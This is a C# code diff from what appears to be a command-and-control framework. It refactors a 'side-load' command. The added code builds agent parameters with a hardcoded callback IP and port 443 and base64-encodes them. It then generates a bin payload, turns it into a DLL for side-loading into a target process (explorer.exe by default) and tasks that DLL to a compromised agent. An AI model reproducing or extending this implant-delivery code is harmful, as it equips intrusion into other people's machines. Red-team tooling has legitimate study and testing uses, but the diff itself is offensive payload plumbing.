@@ -1,8 +1,10 @@
-﻿using ApiModels.Response;
+﻿using ApiModels.Requests;
+using ApiModels.Response;
 using Commander.Commands;
 using Commander.Communication;
 using Commander.Executor;
 using Commander.Terminal;
+using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.CommandLine;
@@ -14,19 +16,19 @@ using System.Threading.Tasks;
 namespace Commander.Commands.SideLoad
 {
 
-    public class SiteLoadCommandOptions
+    public class SiteLoadModuleCommandOptions
     {
         public string parameters { get; set; }
         public string processName { get; set; }
         public bool verbose { get; set; }
     }
 
-    public abstract class SiteLoadCommand : EnhancedCommand<SiteLoadCommandOptions>
+    public abstract class SiteLoadModuleCommand : EnhancedCommand<SiteLoadModuleCommandOptions>
     {
         public override string Category => CommandCategory.Module;
         public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
 
-        public virtual string ExeName { get; set; }
+        public virtual string ModuleName { get; set; }
 
         public virtual string ComputeParams(string innerParams)
         {
@@ -40,11 +42,36 @@ namespace Commander.Commands.SideLoad
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
         };
 
-        protected override async Task<bool> HandleCommand(CommandContext<SiteLoadCommandOptions> context)
+        protected override async Task<bool> HandleCommand(CommandContext<SiteLoadModuleCommandOptions> context)
         {
-            context.Terminal.WriteLine($"Generating bin payload with params {context.CommandParameters}...");
+            
 
-            var result = InjectCommand.GenerateBin(Path.Combine(InjectCommand.ModuleFolder, this.ExeName), this.ComputeParams(context.Options.parameters), out var binFileName);
+            var taskId = Guid.NewGuid().ToString();
+            var taskCmd = "side-load-module";
+            //Generate parameters
+            ExecutionContext exeCtxt = new ExecutionContext()
+            {
+                i =  "192.168.56.102",
+                p = 443,
+                s = "n",
+                id = taskId,
+                a = this.ComputeParams(context.Options.parameters)
+            };
+
+            var ser = JsonConvert.SerializeObject(exeCtxt);
+
+            if (context.Options.verbose)
+                context.Terminal.WriteLine($"Parameters Serialized = {ser}");
+
+            var parms = Convert.ToBase64String(Encoding.UTF8.GetBytes(ser));
+            if(parms.Length > 250)
+            {
+                context.Terminal.WriteError("Parameters too long.");
+                return false;
+            }
+
+            context.Terminal.WriteLine($"Generating bin payload with params {parms}...");
+            var result = InjectCommand.GenerateBin(Path.Combine(InjectCommand.ModuleFolder, this.ModuleName), parms, out var binFileName);
             if (context.Options.verbose)
                 context.Terminal.WriteLine(result);
 
@@ -54,7 +81,7 @@ namespace Commander.Commands.SideLoad
                 context.Options.processName = "explorer.exe";
             }
             context.Terminal.WriteLine($"Generating dll from bin...");
-            result = GenerateDllFromBin(binFileName, context.Options.processName, out var dllFileName);
+            result = SiteLoadCommand.GenerateDllFromBin(binFileName, context.Options.processName, out var dllFileName);
             if (context.Options.verbose)
                 context.Terminal.WriteLine(result);
 
@@ -80,18 +107,9 @@ namespace Commander.Commands.SideLoad
             string fileName = Path.GetFileName(dllFileName);
             //context.Terminal.WriteLine(fileName);
 
-            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "side-load", fileId, fileName);
+            await context.CommModule.TaskAgent(context.CommandLabel, taskId, context.Executor.CurrentAgent.Metadata.Id, taskCmd, fileId, fileName);
             context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
             return true;
-        }
-
-        public static string GenerateDllFromBin(string binpath, string processName, out string dllPath)
-        {
-            var filenamewo = Path.GetFileNameWithoutExtension(binpath);
-            var name = Path.Combine(InjectCommand.TmpFolder, filenamewo + ".dll");
-            string ret = Internal.BinMaker.GenerateDll(binpath, processName, name);
-            dllPath = name;
-            return ret;
         }
     }
 }
